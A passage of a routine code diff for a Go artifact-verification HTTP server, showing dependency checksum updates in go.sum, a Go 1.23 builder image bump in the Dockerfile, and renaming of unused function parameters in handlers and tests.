h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=\n golang.org/x/tools v0.0.0-20190328211700-ab21143f2384/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=\n-golang.org/x/tools v0.0.0-20190425150028-36563e24a262/go.mod h1:RgjU9mgBXZiqYHBnxXauZ1Gv1EHHAz9KjViQ78xBX0Q=\n-golang.org/x/tools v0.0.0-20190506145303-2d16b83fe98c/go.mod h1:RgjU9mgBXZiqYHBnxXauZ1Gv1EHHAz9KjViQ78xBX0Q=\n golang.org/x/tools v0.0.0-20190524140312-2c0ae7006135/go.mod h1:RgjU9mgBXZiqYHBnxXauZ1Gv1EHHAz9KjViQ78xBX0Q=\n-golang.org/x/tools v0.0.0-20190606124116-d0a3d012864b/go.mod h1:/rFqwRUd4F7ZHNgwSSTFct+R/Kf4OFW1sUzUTQQTgfc=\n-golang.org/x/tools v0.0.0-20190621195816-6e04913cbbac/go.mod h1:/rFqwRUd4F7ZHNgwSSTFct+R/Kf4OFW1sUzUTQQTgfc=\n-golang.org/x/tools v0.0.0-20190628153133-6cdbf07be9d0/go.mod h1:/rFqwRUd4F7ZHNgwSSTFct+R/Kf4OFW1sUzUTQQTgfc=\n-golang.org/x/tools v0.0.0-20190816200558-6889da9d5479/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20190911174233-4f2ddba30aff/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191012152004-8de300cfc20a/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191113191852-77e3bb0ad9e7/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191115202509-3a792d9c32b2/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n golang.org/x/tools v0.0.0-20191119224855-298f0cb1881e/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191125144606-a911d9008d1f/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191130070609-6e064ea0cf2d/go.mod h1:b+2E5dAYhXwXZwtnZ6UAqBI28+e2cm9otk0dWdXHAEo=\n-golang.org/x/tools v0.0.0-20191216173652-a0e659d51361/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20191227053925-7b8e75db28f4/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200117161641-43d50277825c/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200122220014-bf1340f18c4a/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200130002326-2f3ba24bd6e7/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200204074204-1cc6d1ef6c74/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200207183749-b753a1ba74fa/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200212150539-ea181f53ac56/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200224181240-023911ca70b2/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200227222343-706bc42d1f0d/go.mod h1:TB2adYChydJhpapKDTa4BR/hXlZSLoq2Wpct/0txZ28=\n-golang.org/x/tools v0.0.0-20200304193943-95d2e580d8eb/go.mod h1:o4KQGtdN14AW+yjsvvwRTJJuXz8XRtIHtEnmAXLyFUw=\n-golang.org/x/tools v0.0.0-20200312045724-11d5b4c81c7d/go.mod h1:o4KQGtdN14AW+yjsvvwRTJJuXz8XRtIHtEnmAXLyFUw=\n-golang.org/x/tools v0.0.0-20200331025713-a30bf2db82d4/go.mod h1:Sl4aGygMT6LrqrWclx+PTx3U+LnKx/seiNR+3G19Ar8=\n-golang.org/x/tools v0.0.0-20200501065659-ab2804fb9c9d/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n golang.org/x/tools v0.0.0-20200509030707-2212a7e161a5/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n-golang.org/x/tools v0.0.0-20200512131952-2bc93b1c0c88/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n-golang.org/x/tools v0.0.0-20200515010526-7d3b6ebf133d/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n-golang.org/x/tools v0.0.0-20200618134242-20370b0cb4b2/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n golang.org/x/tools v0.0.0-20200619180055-7c47624df98f/go.mod h1:EkVYQZoAsY45+roYkvgYkIh4xh/qjgUK9TdY2XT94GE=\n-golang.org/x/tools v0.0.0-20200729194436-6467de6f59a7/go.mod h1:njjCfa9FT2d7l9Bc6FUM5FLjQPp3cFF28FI3qnDFljA=\n-golang.org/x/tools v0.0.0-20200804011535-6c149bb5ef0d/go.mod h1:njjCfa9FT2d7l9Bc6FUM5FLjQPp3cFF28FI3qnDFljA=\n-golang.org/x/tools v0.0.0-20200825202427-b303f430e36d/go.mod h1:njjCfa9FT2d7l9Bc6FUM5FLjQPp3cFF28FI3qnDFljA=\n golang.org/x/tools v0.0.0-20201224043029-2b0845dc783e/go.mod h1:emZCQorbCU4vsT4fOWvOPXz4eW1wZW4PmDk9uLelYpA=\n golang.org/x/tools v0.0.0-20210106214847-113979e3529a/go.mod h1:emZCQorbCU4vsT4fOWvOPXz4eW1wZW4PmDk9uLelYpA=\n golang.org/x/tools v0.1.0/go.mod h1:xkSsbof2nBLbhDlRMhhhyNLN/zl3eTqcnHD5viDpcZ0=\n\n@@ -1102,103 +899,41 @@\ngolang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1/go.mod h1:I/5z698sn9Ka8T\n golang.org/x/xerrors v0.0.0-20220517211312-f3a8303e98df/go.mod h1:K8+ghG5WaK9qNqU5K3HdILfMLy1f3aNYFI/wnl100a8=\n gomodules.xyz/jsonpatch/v2 v2.3.0 h1:8NFhfS6gzxNqjLIYnZxg319wZ5Qjnx4m/CcX+Klzazc=\n gomodules.xyz/jsonpatch/v2 v2.3.0/go.mod h1:AH3dM2RI6uoBZxn3LVrfvJ3E0/9dG4cSrbuBJT4moAY=\n-google.golang.org/api v0.4.0/go.mod h1:8k5glujaEP+g9n7WNsDg8QP6cUVNI86fCNMcbazEtwE=\n-google.golang.org/api v0.7.0/go.mod h1:WtwebWUNSVBH/HAw79HIFXZNqEvBhG+Ra+ax0hx3E3M=\n-google.golang.org/api v0.8.0/go.mod h1:o4eAsZoiT+ibD93RtjEohWalFOjRDx6CVaqeizhEnKg=\n-google.golang.org/api v0.9.0/go.mod h1:o4eAsZoiT+ibD93RtjEohWalFOjRDx6CVaqeizhEnKg=\n-google.golang.org/api v0.13.0/go.mod h1:iLdEw5Ide6rF15KTC1Kkl0iskquN2gFfn9o9XIsbkAI=\n-google.golang.org/api v0.14.0/go.mod h1:iLdEw5Ide6rF15KTC1Kkl0iskquN2gFfn9o9XIsbkAI=\n-google.golang.org/api v0.15.0/go.mod h1:iLdEw5Ide6rF15KTC1Kkl0iskquN2gFfn9o9XIsbkAI=\n-google.golang.org/api v0.17.0/go.mod h1:BwFmGc8tA3vsd7r/7kR8DY7iEEGSU04BFxCo5jP/sfE=\n-google.golang.org/api v0.18.0/go.mod h1:BwFmGc8tA3vsd7r/7kR8DY7iEEGSU04BFxCo5jP/sfE=\n-google.golang.org/api v0.19.0/go.mod h1:BwFmGc8tA3vsd7r/7kR8DY7iEEGSU04BFxCo5jP/sfE=\n-google.golang.org/api v0.20.0/go.mod h1:BwFmGc8tA3vsd7r/7kR8DY7iEEGSU04BFxCo5jP/sfE=\n-google.golang.org/api v0.22.0/go.mod h1:BwFmGc8tA3vsd7r/7kR8DY7iEEGSU04BFxCo5jP/sfE=\n-google.golang.org/api v0.24.0/go.mod h1:lIXQywCXRcnZPGlsd8NbLnOjtAoL6em04bJ9+z0MncE=\n-google.golang.org/api v0.28.0/go.mod h1:lIXQywCXRcnZPGlsd8NbLnOjtAoL6em04bJ9+z0MncE=\n-google.golang.org/api v0.29.0/go.mod h1:Lcubydp8VUV7KeIHD9z2Bys/sm/vGKnG1UHuDBSrHWM=\n-google.golang.org/api v0.30.0/go.mod h1:QGmEvQ87FHZNiUVJkT14jQNYJ4ZJjdRF23ZXz5138Fc=\n google.golang.org/api v0.172.0 h1:/1OcMZGPmW1rX2LCu2CmGUD1KXK1+pfzxotxyRUCCdk=\n google.golang.org/api v0.172.0/go.mod h1:+fJZq6QXWfa9pXhnIzsjx4yI22d4aI9ZpLb58gvXjis=\n google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=\n google.golang.org/appengine v1.4.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv+WjYCduHsrkT7/EB5XEv4=\n-google.golang.org/appengine v1.5.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv+WjYCduHsrkT7/EB5XEv4=\n-google.golang.org/appengine v1.6.1/go.mod h1:i06prIuMbXzDqacNJfV5OdTW448YApPu5ww/cMBSeb0=\n google.golang.org/appengine v1.6.5/go.mod h1:8WjMMxjGQR8xUklV/ARdw2HLXBOI7O7uCIDZVag1xfc=\n-google.golang.org/appengine v1.6.6/go.mod h1:8WjMMxjGQR8xUklV/ARdw2HLXBOI7O7uCIDZVag1xfc=\n google.golang.org/genproto v0.0.0-20180817151627-c66870c02cf8/go.mod h1:JiN7NxoALGmiZfu7CAH4rXhgtRTLTxftemlI0sWmxmc=\n-google.golang.org/genproto v0.0.0-20190307195333-5fe7a883aa19/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=\n-google.golang.org/genproto v0.0.0-20190418145605-e7d98fc518a7/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=\n-google.golang.org/genproto v0.0.0-20190425155659-357c62f0e4bb/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=\n-google.golang.org/genproto v0.0.0-20190502173448-54afdca5d873/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=\n-google.golang.org/genproto v0.0.0-20190801165951-fa694d86fc64/go.mod h1:DMBHOl98Agz4BDEuKkezgsaosCRResVns1a3J2ZsMNc=\n google.golang.org/genproto v0.0.0-20190819201941-24fa4b261c55/go.mod h1:DMBHOl98Agz4BDEuKkezgsaosCRResVns1a3J2ZsMNc=\n-google.golang.org/genproto v0.0.0-20190911173649-1774047e7e51/go.mod h1:IbNlFCBrqXvoKpeg0TB2l7cyZUmoaFKYIwrEpbDKLA8=\n-google.golang.org/genproto v0.0.0-20191108220845-16a3f7862a1a/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20191115194625-c23dd37a84c9/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20191216164720-4f79533eabd1/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20191230161307-f3c370f40bfb/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20200115191322-ca5a22157cba/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20200122232147-0452cf42e150/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=\n-google.golang.org/genproto v0.0.0-20200204135345-fa8e72b47b90/go.mod h1:GmwEX6Z4W5gMy59cAlVYjN9JhxgbQH6Gn+gFDQe2lzA=\n-google.golang.org/genproto v0.0.0-20200212174721-66ed5ce911ce/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200224152610-e50cd9704f63/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200228133532-8c2c7df3a383/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200305110556-506484158171/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200312145019-da6875a35672/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200331122359-1ee6d9798940/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200430143042-b979b6f78d84/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200511104702-f5ebc3bea380/go.mod h1:55QSHmfGQM9UVYDPBsyGGes0y52j32PQ3BqQfXhyH3c=\n-google.golang.org/genproto v0.0.0-20200515170657-fc4c6c6a6587/go.mod h1:YsZOwe1myG/8QRHRsmBRE1LrgQY60beZKjly0O1fX9U=\n-google.golang.org/genproto v0.0.0-20200526211855-cb27e3aa2013/go.mod h1:NbSheEEYHJ7i3ixzK3sjbqSGDJWnxyFXZblF3eUsNvo=\n-google.golang.org/genproto v0.0.0-20200618031413-b414f8b61790/go.mod h1:jDfRM7FcilCzHH/e9qn6dsT145K34l5v+OpcnNgKAAA=\n-google.golang.org/genproto v0.0.0-20200729003335-053ba62fc06f/go.mod h1:FWY/as6DDZQgahTzZj3fqbO1CbirC29ZNUFHwi0/+no=\n-google.golang.org/genproto v0.0.0-20200804131852-c06518451d9c/go.mod h1:FWY/as6DDZQgahTzZj3fqbO1CbirC29ZNUFHwi0/+no=\n-google.golang.org/genproto v0.0.0-20200825200019-8632dd797987/go.mod h1:FWY/as6DDZQgahTzZj3fqbO1CbirC29ZNUFHwi0/+no=\n google.golang.org/genproto v0.0.0-20240311173647-c811ad7063a7 h1:ImUcDPHjTrAqNhlOkSocDLfG9rrNHH7w7uoKWPaWZ8s=\n google.golang.org/genproto v0.0.0-20240311173647-c811ad7063a7/go.mod h1:/3XmxOjePkvmKrHuBy4zNFw7IzxJXtAgdpXi8Ll990U=\n-google.golang.org/genproto/googleapis/api v0.0.0-20240311173647-c811ad7063a7 h1:oqta3O3AnlWbmIE3bFnWbu4bRxZjfbWCp0cKSuZh01E=\n-google.golang.org/genproto/googleapis/api v0.0.0-20240311173647-c811ad7063a7/go.mod h1:VQW3tUculP/D4B+xVCo+VgSq8As6wA9ZjHl//pmk+6s=\n-google.golang.org/genproto/googleapis/rpc v0.0.0-20240318140521-94a12d6c2237 h1:NnYq6UN9ReLM9/Y01KWNOWyI5xQ9kbIms5GGJVwS/Yc=\n-google.golang.org/genproto/googleapis/rpc v0.0.0-20240318140521-94a12d6c2237/go.mod h1:WtryC6hu0hhx87FDGxWCDptyssuo68sk10vYjF+T9fY=\n+google.golang.org/genproto/googleapis/api v0.0.0-20240701130421-f6361c86f094 h1:0+ozOGcrp+Y8Aq8TLNN2Aliibms5LEzsq99ZZmAGYm0=\n+google.golang.org/genproto/googleapis/api v0.0.0-20240701130421-f6361c86f094/go.mod h1:fJ/e3If/Q67Mj99hin0hMhiNyCRmt6BQ2aWIJshUSJw=\n+google.golang.org/genproto/googleapis/rpc v0.0.0-20240701130421-f6361c86f094 h1:BwIjyKYGsK9dMCBOorzRri8MQwmi7mT9rGHsCEinZkA=\n+google.golang.org/genproto/googleapis/rpc v0.0.0-20240701130421-f6361c86f094/go.mod h1:Ue6ibwXGpU+dqIcODieyLOcgj7z8+IcskoNIgZxtrFY=\n google.golang.org/grpc v1.19.0/go.mod h1:mqu4LbDTu4XGKhr4mRzUsmM4RtVoemTSY81AxZiDr8c=\n-google.golang.org/grpc v1.20.1/go.mod h1:10oTOabMzJvdu6/UiuZezV6QK5dSlG84ov/aaiqXj38=\n-google.golang.org/grpc v1.21.1/go.mod h1:oYelfM1adQP15Ek0mdvEgi9Df8B9CZIaU1084ijfRaM=\n google.golang.org/grpc v1.23.0/go.mod h1:Y5yQAOtifL1yxbo5wqy6BxZv8vAUGQwXBOALyacEbxg=\n google.golang.org/grpc v1.25.1/go.mod h1:c3i+UQWmh7LiEpx4sFZnkU36qjEYZ0imhYfXVyQciAY=\n-google.golang.org/grpc v1.26.0/go.mod h1:qbnxyOmOxrQa7FizSgH+ReBfzJrCY1pSN7KXBS8abTk=\n-google.golang.org/grpc v1.27.0/go.mod h1:qbnxyOmOxrQa7FizSgH+ReBfzJrCY1pSN7KXBS8abTk=\n-google.golang.org/grpc v1.27.1/go.mod h1:qbnxyOmOxrQa7FizSgH+ReBfzJrCY1pSN7KXBS8abTk=\n-google.golang.org/grpc v1.28.0/go.mod h1:rpkK4SK4GF4Ach/+MFLZUBavHOvF2JJB5uozKKal+60=\n-google.golang.org/grpc v1.29.1/go.mod h1:itym6AZVZYACWQqET3MqgPpjcuV5QH3BxFS3IjizoKk=\n-google.golang.org/grpc v1.30.0/go.mod h1:N36X2cJ7JwdamYAgDz+s+rVMFjt3numwzf/HckM8pak=\n google.golang.org/grpc v1.31.0/go.mod h1:N36X2cJ7JwdamYAgDz+s+rVMFjt3numwzf/HckM8pak=\n-google.golang.org/grpc v1.62.2 h1:iEIj1U5qjyBjzkM5nk3Fq+S1IbjbXSyqeULZ1Nfo4AA=\n-google.golang.org/grpc v1.62.2/go.mod h1:IWTG0VlJLCh1SkC58F7np9ka9mx/WNkjl4PGJaiq+QE=\n+google.golang.org/grpc v1.66.0 h1:DibZuoBznOxbDQxRINckZcUvnCEvrW9pcWIE2yF9r1c=\n+google.golang.org/grpc v1.66.0/go.mod h1:s3/l6xSSCURdVfAnL+TqCNMyTDAGN6+lZeVxnZR128Y=\n google.golang.org/protobuf v0.0.0-20200109180630-ec00e32a8dfd/go.mod h1:DFci5gLYBciE7Vtevhsrf46CRTquxDuWsQurQQe4oz8=\n google.golang.org/protobuf v0.0.0-20200221191635-4d8936d0db64/go.mod h1:kwYJMbMJ01Woi6D6+Kah6886xMZcty6N08ah7+eCXa0=\n google.golang.org/protobuf v0.0.0-20200228230310-ab0ca4ff8a60/go.mod h1:cfTl7dwQJ+fmap5saPgwCLgHXTUD7jkjRqWcaiX5VyM=\n google.golang.org/protobuf v1.20.1-0.20200309200217-e05f789c0967/go.mod h1:A+miEFZTKqfCUM6K7xSMQL9OKL/b6hQv+e19PK+JZNE=\n google.golang.org/protobuf v1.21.0/go.mod h1:47Nbq4nVaFHyn7ilMalzfO3qCViNmqZ2kzikPIcrTAo=\n-google.golang.org/protobuf v1.22.0/go.mod h1:EGpADcykh3NcUnDUJcl1+ZksZNG86OlYog2l/sGQquU=\n google.golang.org/protobuf v1.23.0/go.mod h1:EGpADcykh3NcUnDUJcl1+ZksZNG86OlYog2l/sGQquU=\n-google.golang.org/protobuf v1.23.1-0.20200526195155-81db48ad09cc/go.mod h1:EGpADcykh3NcUnDUJcl1+ZksZNG86OlYog2l/sGQquU=\n-google.golang.org/protobuf v1.24.0/go.mod h1:r/3tXBNzIEhYS9I1OUVjXDlt8tc493IdKGjtUeSXeh4=\n-google.golang.org/protobuf v1.25.0/go.mod h1:9JNX74DMeImyA3h4bdi1ymwjUzf21/xIlbajtzgsN7c=\n google.golang.org/protobuf v1.26.0-rc.1/go.mod h1:jlhhOSvTdKEhbULTjvd4ARK9grFBp09yW+WbY/TyQbw=\n google.golang.org/protobuf v1.26.0/go.mod h1:9q0QmTI4eRPtz6boOQmLYwt+qCgq0jsYwAQnmE0givc=\n-google.golang.org/protobuf v1.33.0 h1:uNO2rsAINq/JlFpSdYEKIZ0uKD/R9cpdv0T+yoGwGmI=\n-google.golang.org/protobuf v1.33.0/go.mod h1:c6P6GXX6sHbq/GpV6MGZEdwhWPcYBgnhAHhKbcUYpos=\n-gopkg.in/alecthomas/kingpin.v2 v2.2.6/go.mod h1:FMv+mEhP44yOT+4EoQTLFTRgOQ1FBLkstjWtayDeSgw=\n+google.golang.org/protobuf v1.34.2 h1:6xV6lTsCfpGD21XK49h7MhtcApnLqkfYgPcdHftf6hg=\n+google.golang.org/protobuf v1.34.2/go.mod h1:qYOHts0dSfpeUzUFpOMr/WGzszTmLH+DiWniOlNbLDw=\n gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=\n gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=\n gopkg.in/check.v1 v1.0.0-20200227125254-8fa46927fb4f/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=\n gopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c h1:Hei/4ADfdWqJk1ZMxUNpqntNwaWcugrBjAiHlqqRiVk=\n gopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c/go.mod h1:JHkPIbrfpd72SG/EVd6muEfDQjcINNoR0C8j2r3qZ4Q=\n-gopkg.in/errgo.v2 v2.1.0/go.mod h1:hNsd1EY+bozCKY1Ytp96fpM3vjJbqLJn88ws8XvfDNI=\n gopkg.in/fsnotify.v1 v1.4.7/go.mod h1:Tz8NjZHkW78fSQdbUxIjBTcgA1z1m8ZHf0WmKUhAMys=\n-gopkg.in/go-jose/go-jose.v2 v2.6.3 h1:nt80fvSDlhKWQgSWyHyy5CfmlQr+asih51R8PTWNKKs=\n-gopkg.in/go-jose/go-jose.v2 v2.6.3/go.mod h1:zzZDPkNNw/c9IE7Z9jr11mBZQhKQTMzoEEIoEdZlFBI=\n gopkg.in/inf.v0 v0.9.1 h1:73M5CoZyi3ZLMOyDlQh031Cx6N9NDJ2Vvfl76EDAgDc=\n gopkg.in/inf.v0 v0.9.1/go.mod h1:cWUDdTG/fYaXco+Dcufb5Vnc6Gp2YChqWtbxRZE0mXw=\n gopkg.in/ini.v1 v1.56.0/go.mod h1:pNLf8WUiyNEtQjuu5G5vTm06TEv9tsIgeAvK8hOrP4k=\n\n@@ -1218,12 +953,7 @@\ngopkg.in/yaml.v3 v3.0.1/go.mod h1:K4uyk7z7BCEPqu6E+C64Yfv1cQ7kz7rIZviUmN+EgEM=\n gotest.tools/v3 v3.1.0 h1:rVV8Tcg/8jHUkPUorwjaMTtemIMVXfIPKiOqnhEhakk=\n gotest.tools/v3 v3.1.0/go.mod h1:fHy7eyTmJFO5bQbUsEGQ1v4m2J3Jz9eWL54TP2/ZuYQ=\n honnef.co/go/tools v0.0.0-20190102054323-c2f93a96b099/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=\n-honnef.co/go/tools v0.0.0-20190106161140-3f1c8253044a/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=\n-honnef.co/go/tools v0.0.0-20190418001031-e561f6794a2a/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=\n honnef.co/go/tools v0.0.0-20190523083050-ea95bdfd59fc/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=\n-honnef.co/go/tools v0.0.1-2019.2.3/go.mod h1:a3bituU0lyd329TUQxRnasdCoJDkEUEAqEt0JzvZhAg=\n-honnef.co/go/tools v0.0.1-2020.1.3/go.mod h1:X/FiERA/W4tHapMX5mGpAtMSVEeEUOyHaw9vFzvIQ3k=\n-honnef.co/go/tools v0.0.1-2020.1.4/go.mod h1:X/FiERA/W4tHapMX5mGpAtMSVEeEUOyHaw9vFzvIQ3k=\n k8s.io/api v0.28.11 h1:2qFr3jSpjy/9QirmlRP0LZeomexuwyRlE8CWUn9hPNY=\n k8s.io/api v0.28.11/go.mod h1:nQSGyxQ2sbS73i1zEJyaktFvFfD72z/7nU+LqxzNnXk=\n k8s.io/apiextensions-apiserver v0.27.7 h1:YqIOwZAUokzxJIjunmUd4zS1v3JhK34EPXn+pP0/bsU=\n\n@@ -1244,9 +974,6 @@\nk8s.io/utils v0.0.0-20230726121419-3b25d923346b h1:sgn3ZU783SCgtaSJjpcVVlRqd6GSn\n k8s.io/utils v0.0.0-20230726121419-3b25d923346b/go.mod h1:OLgZIPagt7ERELqWJFomSt595RzquPNLL48iOWgYOg0=\n oras.land/oras-go/v2 v2.5.0 h1:o8Me9kLY74Vp5uw07QXPiitjsw7qNXi8Twd+19Zf02c=\n oras.land/oras-go/v2 v2.5.0/go.mod h1:z4eisnLP530vwIOUOJeBIj0aGI0L1C3d53atvCBqZHg=\n-rsc.io/binaryregexp v0.2.0/go.mod h1:qTv7/COck+e2FymRvadv62gMdZztPaShugOCi3I+8D8=\n-rsc.io/quote/v3 v3.1.0/go.mod h1:yEA65RcK8LyAZtP9Kv3t0HmxON59tX3rD+tICJqUlj0=\n-rsc.io/sampler v1.3.0/go.mod h1:T1hPZKmBbMNahiBKFy5HrXp6adAjACjK9JXDnKaTXpA=\n sigs.k8s.io/controller-runtime v0.15.3 h1:L+t5heIaI3zeejoIyyvLQs5vTVu/67IU2FfisVzFlBc=\n sigs.k8s.io/controller-runtime v0.15.3/go.mod h1:kp4jckA4vTx281S/0Yk2LFEEQe67mjg+ev/yknv47Ds=\n sigs.k8s.io/json v0.0.0-20221116044647-bc3834ca7abd h1:EDPBXCAspyGV4jQlpZSudPeMmr1bNJefnuqLsRAsHZo=\n```\n\nFilename: httpserver/Dockerfile:\n```\n@@ -11,7 +11,7 @@\n# See the License for the specific language governing permissions and\n # limitations under the License.\n \n-FROM --platform=$BUILDPLATFORM golang:1.21@sha256:392d2b634cba642c48e23b22949af823d42f4e722ca2d9f519133445e5a4cbba as builder\n+FROM --platform=$BUILDPLATFORM golang:1.23@sha256:73f06be4578c9987ce560087e2e2ea6485fb605e3910542cadd8fa09fc5f3e31 as builder\n \n ARG TARGETPLATFORM\n ARG TARGETOS\n```\n\nFilename: httpserver/handlers.go:\n```\n@@ -287,7 +287,7 @@\nfunc sendResponse(results *[]externaldata.Item, systemErr string, w http.Respons\n }\n \n func processTimeout(h ContextHandler, duration time.Duration, isMutation bool) ContextHandler {\n-\treturn func(handlerContext context.Context, w http.ResponseWriter, r *http.Request) error {\n+\treturn func(_ context.Context, w http.ResponseWriter, r *http.Request) error {\n \t\tctx, cancel := context.WithTimeout(r.Context(), duration)\n \t\tdefer cancel()\n```\n\nFilename: httpserver/server_test.go:\n```\n@@ -126,7 +126,7 @@\nfunc TestServer_Timeout_Failed(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\ttime.Sleep(time.Duration(timeoutDuration) * time.Second)\n \t\t\t\treturn true\n \t\t\t},\n\n@@ -194,7 +194,7 @@\nfunc TestServer_MultipleSubjects_Success(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\treturn true\n \t\t\t},\n \t\t}\n\n@@ -268,7 +268,7 @@\nfunc TestServer_Mutation_Success(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\ttime.Sleep(time.Duration(timeoutDuration) * time.Second)\n \t\t\t\treturn true\n \t\t\t},\n\n@@ -344,7 +344,7 @@\nfunc TestServer_Mutation_ReferrerStoreConfigInvalid_Failure(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\ttime.Sleep(time.Duration(timeoutDuration) * time.Second)\n \t\t\t\treturn true\n \t\t\t},\n\n@@ -423,7 +423,7 @@\nfunc TestServer_MultipleRequestsForSameSubject_Success(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: 